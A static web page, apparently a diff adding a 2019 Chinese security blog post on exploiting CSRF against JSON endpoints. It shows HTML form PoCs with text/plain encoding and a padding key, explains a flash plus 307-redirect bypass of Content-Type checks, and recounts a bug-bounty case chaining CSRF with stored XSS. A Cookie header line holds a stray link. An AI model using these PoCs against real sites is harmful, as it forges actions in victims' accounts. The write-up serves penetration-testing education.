@@ -1,0 +1,141 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="CL0ud1"><meta name="renderer" content="webkit"><meta name="copyright" content="CL0ud1"><meta name="keywords" content="CL0ud1's SecBlog"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CL0ud1's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/lufei.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">CL0ud1</div><div class="profile-signature">for me</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">CL0ud1's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title"></h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-04-13</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="关于JSON-CSRF利用思路总结"><a href="#关于JSON-CSRF利用思路总结" class="headerlink" title="关于JSON CSRF利用思路总结"></a>关于JSON CSRF利用思路总结</h1><p>在平时我们做渗透测试中，我们经常会遇到一些通过post提交json数组的CSRF漏洞，本文总结下关于JSON写入型CSRF的利用思路总结：</p>
+<h3 id="攻击失败原因："><a href="#攻击失败原因：" class="headerlink" title="攻击失败原因："></a>攻击失败原因：</h3><p>很多小伙伴遇到这种类型的CSRF通常会通过Burp的Genrate CSRF POC去生成相对应的CSRF_POC进行攻击。</p>
+<p>例如，原始数据包如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: xxx.com</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 371</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie:](  https://www.mzxh.xyz) </span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;CL0ud1&quot;,&quot;age&quot;:&quot;18&quot;,&apos;password&apos;:&quot;123456&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>我们通过Burp的Genrate CSRF 一键生成CSRF_POC如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure>
+<p><form action="https://xxx.com" method="POST" enctype="text/plain"><br>  <input type="hidden" name="&#123;&quot;username&quot;&#58;&quot;CL0ud1&quot;&#44;&quot;age&quot;&#58;&quot;18&quot;&#44;&apos;password&apos;&#58;&quot;123456&quot;&#125;" value><br>  <input type="submit" value="Submit request"><br></form><br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们会发现一个问题，自动生产的CSRF_POC在请求时候会在末尾多一个“=”：</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552834244279.png" alt="1552834244279"></p>
+<p>服务端的json解析器是无法成功识别不规范的JSON数据形式，导致我们的CSRF攻击失败。</p>
+<p>我们进行多一对的key value赋值去消失”=”。前提是我们先通过Burp去重放存在CSRF的漏洞接口判断是否识别多余的key value，若是可以识别，可利用如下poc进行CSRF攻击：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;form action=&quot;http://example.com/admin&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;   &lt;input name=&apos;&#123;&quot;username&quot;:&quot;CL0ud1&quot;,&quot;age&quot;:&quot;18&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;test&quot;:&quot;&apos; value=&apos;test&quot;&#125;&apos;type=&apos;hidden&apos;&gt;   &lt;input type=submit&gt;   </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>请求数据体如下：</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552835501147.png" alt="1552835501147"></p>
+<p>但是，有时候通过此方法还是不能造成攻击。其实不难发现，这里是校验了Content-Type: application/json，而使用form只能设置为Content-Type: text/plain从而导致攻击失败。</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552836705861.png" alt="1552836705861"></p>
+<h3 id="突破ctpye校验攻击："><a href="#突破ctpye校验攻击：" class="headerlink" title="突破ctpye校验攻击："></a>突破ctpye校验攻击：</h3><p>那么对于这种校验Content-Type: application/json的情况，且再第一个POC失效的情况下，我们如何去突破呢？</p>
+<p>重点来了！使用flash劫持+307重定向实现CSRF攻击：</p>
+<p>首先我们先认识下http307重定向，使用http307重定向的好处是可以保证重定向后保留了我们的请求方法和请求体都不会发生变化。</p>
+<p>攻击思路如下：</p>
+<p>1、HTTP POST请求。</p>
+<p>2、从攻击者服务器发起307跳转，跳转到vuln.com，注意307跳转会带着http请求方式，header和postdata进行跳转。</p>
+<p>3、vuln.com收到一条POST请求，并且Content-Type为application/json。</p>
+<p>4、vuln.com收到一条/crossdomain.xml请求。由于第三步优先第四步执行，导致跨域。</p>
+<h3 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h3><p>这里通过我一次实际众测案例进行具体分析：</p>
+<p>某站用户后台添加用户姓名处存在存储型XSS漏洞：</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552878937644.png" alt="1552878937644"></p>
+<p>从POST数据包我们可以分析得出，该漏洞接口并未设置CSRF防护措施，但是通过提交json数组来更改用户信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /user HTTP/1.1</span><br><span class="line">Host: CL0ud1.com</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 363</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: xxxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;avatar&quot;:&quot;&quot;,&quot;come_from&quot;:&quot;&quot;,&quot;company_id&quot;:&quot;&quot;,&quot;department&quot;:&quot;&quot;,&quot;description&quot;:&quot;&quot;,&quot;email&quot;:&quot;&quot;,&quot;end_time&quot;:1553058600,&quot;gender&quot;:0,&quot;id&quot;:0,&quot;interviewee&quot;:&quot;&quot;,&quot;name&quot;:&quot;xsstest&quot;,&quot;password_reseted&quot;:false,&quot;phone&quot;:&quot;&quot;,&quot;photos&quot;:[],&quot;purpose&quot;:&quot;0&quot;,&quot;start_time&quot;:1552881600,&quot;subject_type&quot;:1,&quot;visitor_type&quot;:1,&quot;title&quot;:&quot;&quot;,&quot;photo_ids&quot;:[],&quot;job_number&quot;:0,&quot;remark&quot;:&quot;&quot;,&quot;entry_date&quot;:0,&quot;birthday&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+<p>我们通过修改Content-Type: text/plain 响应包报错如下所示：</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552879505722.png" alt="1552879505722"></p>
+<p>综上所述，我们对于校验了Content-Type的json_csrf需要通过flash+307跨域劫持进行攻击：</p>
+<p>这里我们使用<a href="http://cm2.pw/crossdomain在线平台进行测试：" target="_blank" rel="noopener">http://cm2.pw/crossdomain在线平台进行测试：</a></p>
+<p>1、首先在攻击平台上，定义好Content-Type: application/json;charset=UTF-8</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1555147553384.png" alt="1555147553384"></p>
+<p>2、在request Date填写我们Post请求的数据包：</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1555147611313.png" alt="1555147611313"></p>
+<p>3、然后通过cm2进行flash+307跨域请求去进行json_csrf攻击：</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1555147923173.png" alt="1555147923173"></p>
+<p>4、成功触发CSRF+存储型XSS攻击：</p>
+<p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1555147957834.png" alt="1555147957834"></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://cl0ud.site">CL0ud1</a></p><p> <span>Link:  </span><a href="http://cl0ud.site/2019/04/13/关于JSON CSRF利用思路总结/">http://cl0ud.site/2019/04/13/关于JSON CSRF利用思路总结/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#关于JSON-CSRF利用思路总结"><span class="toc-number">1.</span> <span class="toc-text">关于JSON CSRF利用思路总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击失败原因："><span class="toc-number">1.0.1.</span> <span class="toc-text">攻击失败原因：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#突破ctpye校验攻击："><span class="toc-number">1.0.2.</span> <span class="toc-text">突破ctpye校验攻击：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例分享"><span class="toc-number">1.0.3.</span> <span class="toc-text">案例分享</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
